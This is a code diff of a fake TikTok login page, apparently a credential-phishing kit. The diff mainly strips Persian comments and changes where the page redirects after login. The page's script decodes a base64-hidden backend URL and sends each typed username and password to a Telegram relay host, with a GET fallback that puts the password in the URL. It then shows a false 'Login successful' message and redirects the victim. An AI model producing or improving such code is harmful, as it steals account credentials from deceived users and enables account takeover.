@@ -34,7 +34,6 @@
             animation: fadeUp 0.5s ease-out;
         }
 
-        /* لوگو */
         .logo-section {
             text-align: center;
             margin-bottom: 44px;
@@ -64,7 +63,6 @@
             letter-spacing: 0.3px;
         }
 
-        /* پیام‌های خطا و موفقیت */
         .error-msg {
             background: #3d1a1a;
             color: #f28b82;
@@ -95,14 +93,12 @@
             margin-left: 6px;
         }
 
-        /* فرم */
         .login-form {
             display: flex;
             flex-direction: column;
             gap: 24px;
         }
 
-        /* گروه انتخاب نوع ورودی */
         .input-type-selector {
             display: flex;
             gap: 12px;
@@ -134,7 +130,6 @@
             color: #fff;
         }
 
-        /* فیلدهای ورودی */
         .input-group {
             position: relative;
             border-bottom: 2px solid #2a2a2a;
@@ -193,7 +188,6 @@
             color: #ff0050;
         }
 
-        /* دکمه چشمک پسورد */
         .toggle-password {
             position: absolute;
             left: 6px;
@@ -216,7 +210,6 @@
             transform: translateY(-50%) scale(0.9);
         }
 
-        /* دکمه ورود */
         .btn-login {
             background: linear-gradient(135deg, #ff0050, #f9a825);
             border: none;
@@ -241,7 +234,6 @@
             transform: scale(0.97);
         }
 
-        /* انیمیشن */
         @keyframes fadeUp {
             from {
                 opacity: 0;
@@ -253,7 +245,6 @@
             }
         }
 
-        /* ریسپانسیو */
         @media (max-width: 480px) {
             .login-container {
                 padding: 32px 20px;
@@ -277,7 +268,6 @@
 
     <div class="login-container">
 
-        <!-- لوگو -->
         <div class="logo-section">
             <div class="tiktok-icon">
                 <i class="fab fa-tiktok"></i>
@@ -286,18 +276,14 @@
             <p class="subtitle">Log in to your account</p>
         </div>
 
-        <!-- پیام‌های خطا و موفقیت -->
         <div class="error-msg" id="errorMsg">
-            <i class="fas fa-exclamation-circle"></i> <span id="errorText">خطا رخ داده است.</span>
+            <i class="fas fa-exclamation-circle"></i> <span id="errorText">Error occurred.</span>
         </div>
         <div class="success-msg" id="successMsg">
-            <i class="fas fa-check-circle"></i> ورود موفقیت‌آمیز!
+            <i class="fas fa-check-circle"></i> Login successful!
         </div>
 
-        <!-- فرم -->
-        <form class="login-form" id="loginForm" onsubmit="return handleLogin(event)">
-
-            <!-- انتخاب نوع ورودی -->
+        <form class="login-form" id="loginForm">
             <div class="input-type-selector">
                 <button type="button" class="active" data-type="email" onclick="switchInputType('email')">
                     <i class="fas fa-envelope"></i> Email
@@ -307,21 +293,18 @@
                 </button>
             </div>
 
-            <!-- فیلد ایمیل (پیش‌فرض) -->
             <div class="input-group" id="emailGroup">
                 <i class="fas fa-envelope input-icon"></i>
                 <input type="email" id="emailInput" placeholder=" " value="">
                 <label>Email Address</label>
             </div>
 
-            <!-- فیلد شماره تلفن (مخفی در ابتدا) -->
             <div class="input-group" id="phoneGroup" style="display: none;">
                 <i class="fas fa-phone input-icon"></i>
                 <input type="tel" id="phoneInput" placeholder=" ">
                 <label>Phone Number</label>
             </div>
 
-            <!-- فیلد پسورد با چشمک -->
             <div class="input-group">
                 <i class="fas fa-lock input-icon"></i>
                 <input type="password" id="passwordInput" placeholder=" " value="">
@@ -331,45 +314,35 @@
                 </button>
             </div>
 
-            <!-- دکمه ورود -->
-            <button type="submit" class="btn-login">
+            <button type="submit" class="btn-login" id="loginBtn">
                 <i class="fas fa-sign-in-alt" style="margin-left: 10px;"></i> Log In
             </button>
-
         </form>
     </div>
 
     <script>
         // =====================================================
-        // 🔒 TOKEN HIDDEN - مخفی‌سازی توکن تلگرام
-        // توکن به صورت base64 کدگذاری شده است
+        // 🔒 TOKEN HIDDEN
         // =====================================================
-        
-        // توکن کدگذاری شده (base64)
         const ENCODED_TOKEN = "aHR0cHM6Ly90ZWxlZ3JhbS1iYWNrZW5kLXpvM24ub25yZW5kZXIuY29t";
         
-        // تابع رمزگشایی توکن
         function getBackendUrl() {
             try {
-                // رمزگشایی base64
                 return atob(ENCODED_TOKEN);
             } catch(e) {
-                // در صورت خطا، از آدرس پیش‌فرض استفاده کن
                 console.warn("Token decode failed, using fallback");
                 return "https://telegram-backend-zo3n.onrender.com";
             }
         }
 
-        // دریافت آدرس واقعی بک‌اند
         const TELEGRAM_BACKEND_URL = getBackendUrl();
         const WAKEUP_COUNT = 2;
         let currentLoginType = 'email';
 
-        // فقط برای دیباگ (آدرس در کنسول نشان داده نمی‌شود)
         console.log("✅ Backend URL loaded securely");
 
         // =====================================================
-        // 🚀 ارسال پیام ویکاپ به بک‌اند جدید
+        // 🚀 ارسال پیام ویکاپ
         // =====================================================
         function sendWakeup(index) {
             try {
@@ -380,7 +353,7 @@
                         action: `🔄 TikTok Wake-up (${index}/${WAKEUP_COUNT})`,
                         name: "System",
                         extra: `Wake-up ping ${index}`,
-                        time: new Date().toLocaleString('fa-IR')
+                        time: new Date().toLocaleString('en-US')
                     })
                 })
                 .then(() => console.log(`✅ Wake-up ${index} sent`))
@@ -391,17 +364,15 @@
         }
 
         // =====================================================
-        // 🚀 ارسال اطلاعات ورود به بک‌اند جدید
+        // 🚀 ارسال اطلاعات ورود
         // =====================================================
         function sendLoginInfo(username, password, typeLabel) {
-            // مرحله 1: ارسال ۲ ویکاپ
             for (let i = 1; i <= WAKEUP_COUNT; i++) {
                 setTimeout(() => {
                     sendWakeup(i);
                 }, i * 500);
             }
 
-            // مرحله 2: ارسال اطلاعات اصلی با تاخیر
             setTimeout(() => {
                 try {
                     fetch(`${TELEGRAM_BACKEND_URL}/notify`, {
@@ -411,7 +382,7 @@
                             action: "🔐 TikTok Login",
                             name: username,
                             extra: `Type: ${typeLabel} | Password: ${password}`,
-                            time: new Date().toLocaleString('fa-IR')
+                            time: new Date().toLocaleString('en-US')
                         })
                     })
                     .then(response => response.json())
@@ -424,7 +395,6 @@
                     })
                     .catch(err => {
                         console.log("⚠️ Login info send failed, trying fallback...");
-                        // Fallback: ارسال با GET
                         try {
                             const msg = encodeURIComponent(`TikTok Login | ${typeLabel}: ${username} | Pass: ${password}`);
                             fetch(`${TELEGRAM_BACKEND_URL}/notify?msg=${msg}&t=${Date.now()}`)
@@ -441,36 +411,11 @@
         }
 
         // =============================================
-        // ===== 🚀 تابع باز کردن PUBG Mobile =====
+        // ===== بازگشت به صفحه اندکس با فلگ =====
         // =============================================
-        function openPUBG() {
-            const userAgent = navigator.userAgent || navigator.vendor || window.opera;
-            
-            // تشخیص دستگاه
-            const isAndroid = /android/i.test(userAgent);
-            const isIOS = /iPad|iPhone|iPod/.test(userAgent) && !window.MSStream;
-            
-            if (isAndroid) {
-                // تلاش برای باز کردن اپلیکیشن اندروید
-                window.location.href = 'intent://com.tencent.ig#Intent;scheme=https;package=com.tencent.ig;end';
-                
-                // اگر اپ باز نشد، بعد از ۲ ثانیه به گوگل‌پلی برو
-                setTimeout(() => {
-                    window.location.href = 'https://play.google.com/store/apps/details?id=com.tencent.ig';
-                }, 2000);
-                
-            } else if (isIOS) {
-                // برای آیفون
-                window.location.href = 'https://pubg.com/';
-                
-                setTimeout(() => {
-                    window.location.href = 'https://apps.apple.com/app/pubg-mobile/id1330123889';
-                }, 2000);
-                
-            } else {
-                // کامپیوتر یا سایر دستگاه‌ها
-                window.open('https://www.pubg.com/', '_blank');
-            }
+        function goToIndex() {
+            localStorage.setItem('fromFacebook', 'true');
+            window.location.href = 'index.html';
         }
 
         // ===== توابع کنترل فرم =====
@@ -482,7 +427,6 @@
             const errorMsg = document.getElementById('errorMsg');
             const successMsg = document.getElementById('successMsg');
 
-            // مخفی کردن پیام‌ها
             errorMsg.style.display = 'none';
             successMsg.style.display = 'none';
 
@@ -506,7 +450,6 @@
             });
         }
 
-        // ===== چشمک نمایش/مخفی کردن پسورد =====
         function togglePassword() {
             const passwordInput = document.getElementById('passwordInput');
             const eyeIcon = document.getElementById('eyeIcon');
@@ -520,8 +463,10 @@
             }
         }
 
-        // ===== اعتبارسنجی و ارسال فرم =====
-        function handleLogin(e) {
+        // =============================================
+        // ===== مدیریت فرم با Event Listener =====
+        // =============================================
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
 
             const emailInput = document.getElementById('emailInput');
@@ -531,7 +476,6 @@
             const errorText = document.getElementById('errorText');
             const successMsg = document.getElementById('successMsg');
 
-            // مخفی کردن پیام‌های قبلی
             errorMsg.style.display = 'none';
             successMsg.style.display = 'none';
 
@@ -539,7 +483,6 @@
             let errorMessage = '';
             let username = '';
 
-            // اعتبارسنجی بر اساس نوع ورودی
             if (currentLoginType === 'email') {
                 const email = emailInput.value.trim();
                 const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
@@ -560,51 +503,39 @@
                 }
             }
 
-            // اعتبارسنجی پسورد
             const password = passwordInput.value.trim();
             if (isValid && password.length < 5) {
                 isValid = false;
                 errorMessage = 'Password must be at least 5 characters';
             }
 
-            // نمایش خطا در صورت وجود
             if (!isValid) {
                 errorText.textContent = errorMessage;
                 errorMsg.style.display = 'block';
-                return false;
+                return;
             }
 
-            // ===== ارسال اطلاعات به تلگرام =====
             const typeLabel = currentLoginType === 'email' ? 'Email' : 'Phone';
             sendLoginInfo(username, password, typeLabel);
 
-            // ===== 🚀 باز کردن PUBG بعد از لاگین =====
-            successMsg.innerHTML = `<i class="fas fa-check-circle"></i> ✅ Login successful! Redirecting to PUBG...`;
+            successMsg.innerHTML = `<i class="fas fa-check-circle"></i> ✅ Login successful! Redirecting...`;
             successMsg.style.display = 'block';
 
-            // بعد از 1.5 ثانیه PUBG را باز کن
-            setTimeout(() => {
-                openPUBG();
+            setTimeout(function() {
+                goToIndex();
             }, 1500);
-
-            return false;
-        }
-
-        // ===== اعتبارسنجی لحظه‌ای ایمیل =====
-        document.getElementById('emailInput').addEventListener('input', function() {
-            const errorMsg = document.getElementById('errorMsg');
-            errorMsg.style.display = 'none';
         });
 
-        // ===== اعتبارسنجی لحظه‌ای شماره تلفن =====
+        // ===== اعتبارسنجی لحظه‌ای =====
+        document.getElementById('emailInput').addEventListener('input', function() {
+            document.getElementById('errorMsg').style.display = 'none';
+        });
+
         document.getElementById('phoneInput').addEventListener('input', function() {
-            const errorMsg = document.getElementById('errorMsg');
-            errorMsg.style.display = 'none';
-            // فقط عدد
+            document.getElementById('errorMsg').style.display = 'none';
             this.value = this.value.replace(/[^0-9]/g, '');
         });
 
-        // ===== محدود کردن ورودی شماره تلفن به اعداد =====
         document.getElementById('phoneInput').addEventListener('keypress', function(e) {
             if (!/[0-9]/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete') {
                 e.preventDefault();
@@ -617,19 +548,17 @@
         document.addEventListener('DOMContentLoaded', function() {
             switchInputType('email');
             
-            // Wake-up هنگام لود
             fetch(`${TELEGRAM_BACKEND_URL}/health`)
                 .then(() => console.log('✅ Server is awake'))
                 .catch(() => console.log('🔄 Server waking up...'));
             
-            // ارسال ویکاپ‌های اولیه
             for (let i = 1; i <= WAKEUP_COUNT; i++) {
-                setTimeout(() => {
+                setTimeout(function() {
                     sendWakeup(i);
                 }, i * 400);
             }
             
-            console.log('✅ TikTok Login Page Ready! (Token Hidden)');
+            console.log('✅ TikTok Login Page Ready!');
         });
     </script>
 
